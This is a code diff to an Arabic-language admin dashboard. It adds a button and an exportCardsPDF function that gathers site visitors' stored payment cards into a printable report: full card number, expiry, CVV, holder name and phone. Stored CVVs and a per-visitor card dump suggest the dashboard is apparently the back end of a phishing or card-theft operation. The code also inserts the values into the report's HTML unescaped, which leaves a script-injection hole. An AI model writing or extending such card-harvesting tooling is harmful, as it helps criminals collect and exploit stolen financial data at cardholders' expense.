@@ -61,6 +61,12 @@
                 </svg>
                 <span>تغيير كلمة المرور</span>
               </button>
+              <button onclick="exportCardsPDF()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-blue-600 border-t">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
+                </svg>
+                <span>استيراد البطاقات PDF</span>
+              </button>
               <button onclick="clearAllData()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-orange-600 border-t">
                 <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/>
@@ -1970,6 +1976,135 @@
           alert('تم مسح جميع البيانات بنجاح');
         }
       }
+    }
+
+    // Export Cards to PDF function
+    function exportCardsPDF() {
+      // جمع جميع البطاقات من جميع الزوار
+      const allCards = [];
+      visitors.forEach((visitor) => {
+        if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+          visitor.paymentCards.forEach((card) => {
+            allCards.push({
+              visitorName: visitor.fullName || 'غير معروف',
+              visitorPhone: visitor.phone || 'غير معروف',
+              cardNumber: card.cardNumber || '',
+              expiryDate: card.expiryDate || '',
+              cvv: card.cvv || '',
+              cardHolder: card.cardHolder || '',
+              timestamp: card.timestamp || ''
+            });
+          });
+        }
+      });
+
+      if (allCards.length === 0) {
+        alert('لا توجد بطاقات لتصديرها');
+        return;
+      }
+
+      // إنشاء محتوى HTML للـ PDF
+      let htmlContent = `
+        <!DOCTYPE html>
+        <html dir="rtl" lang="ar">
+        <head>
+          <meta charset="UTF-8">
+          <title>تقرير البطاقات</title>
+          <style>
+            body {
+              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+              padding: 20px;
+              direction: rtl;
+            }
+            h1 {
+              text-align: center;
+              color: #333;
+              margin-bottom: 30px;
+            }
+            .card {
+              border: 1px solid #ddd;
+              border-radius: 10px;
+              padding: 15px;
+              margin-bottom: 20px;
+              background: #f9f9f9;
+              page-break-inside: avoid;
+            }
+            .card-header {
+              font-weight: bold;
+              font-size: 18px;
+              color: #2563eb;
+              margin-bottom: 10px;
+              border-bottom: 1px solid #ddd;
+              padding-bottom: 10px;
+            }
+            .card-row {
+              display: flex;
+              justify-content: space-between;
+              margin: 8px 0;
+            }
+            .card-label {
+              font-weight: bold;
+              color: #666;
+            }
+            .card-value {
+              color: #333;
+              font-family: monospace;
+              font-size: 16px;
+            }
+            .timestamp {
+              font-size: 12px;
+              color: #999;
+              text-align: left;
+              margin-top: 10px;
+            }
+            @media print {
+              .card { page-break-inside: avoid; }
+            }
+          </style>
+        </head>
+        <body>
+          <h1>📋 تقرير البطاقات</h1>
+          <p style="text-align: center; color: #666;">عدد البطاقات: ${allCards.length}</p>
+      `;
+
+      allCards.forEach((card, index) => {
+        htmlContent += `
+          <div class="card">
+            <div class="card-header">بطاقة #${index + 1} - ${card.visitorName}</div>
+            <div class="card-row">
+              <span class="card-label">رقم الجوال:</span>
+              <span class="card-value">${card.visitorPhone}</span>
+            </div>
+            <div class="card-row">
+              <span class="card-label">رقم البطاقة:</span>
+              <span class="card-value">${card.cardNumber}</span>
+            </div>
+            <div class="card-row">
+              <span class="card-label">تاريخ الانتهاء:</span>
+              <span class="card-value">${card.expiryDate}</span>
+            </div>
+            <div class="card-row">
+              <span class="card-label">CVV:</span>
+              <span class="card-value">${card.cvv}</span>
+            </div>
+            <div class="card-row">
+              <span class="card-label">اسم حامل البطاقة:</span>
+              <span class="card-value">${card.cardHolder}</span>
+            </div>
+            <div class="timestamp">التاريخ: ${card.timestamp ? new Date(card.timestamp).toLocaleString('ar-SA') : 'غير معروف'}</div>
+          </div>
+        `;
+      });
+
+      htmlContent += '</body></html>';
+
+      // فتح نافذة جديدة وطباعتها كـ PDF
+      const printWindow = window.open('', '_blank');
+      printWindow.document.write(htmlContent);
+      printWindow.document.close();
+      printWindow.onload = function() {
+        printWindow.print();
+      };
     }
 
     // Logout function
